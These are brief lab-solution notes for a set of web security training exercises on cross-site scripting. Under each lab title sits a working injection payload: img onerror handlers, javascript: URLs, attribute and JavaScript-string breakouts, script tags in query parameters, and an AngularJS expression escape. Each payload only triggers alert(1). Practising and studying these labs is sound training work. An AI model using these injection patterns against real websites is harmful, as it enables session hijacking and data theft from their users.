## Lab: DOM XSS in innerHTML sink using source

-> payload: ```<img src='123.png' onerror='alert(1)'>```


## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

payload: ```https://ac8e1fa11fa32607c0a0cfa800b700a8.web-security-academy.net/feedback?returnPath=javascript:alert(1)```


## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

-> payload: ``` " autofocus onfocusin='alert(1)' x="```


## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

-> payload: ``` https://www.youtube.com/`  x="><img src="1.png" onerror="alert(1)">``` (fill to website)


## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

-> payload: ``` 123'; alert(1);//```


## Lab: DOM XSS in document.write sink using source location.search inside a select element

-> payload: ``` https://ac9f1f821eb31b49c04d25da00ca00f3.web-security-academy.net/product?productId=1&storeId=<script>alert(1)</script>```


## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

-> payload: ``` {{constructor.constructor('alert(1)')()}}```


## Lab: Reflected DOM XSS

-> payload: ```123\"};alert(1)//``` (`"` being escaped but `\` not being escaped)


## Lab: Stored DOM XSS

-> payload: ```<> <img="1.jpg" onerror="alert(1)">``` (replace function only replace the first argument of string, other argument not reqpace )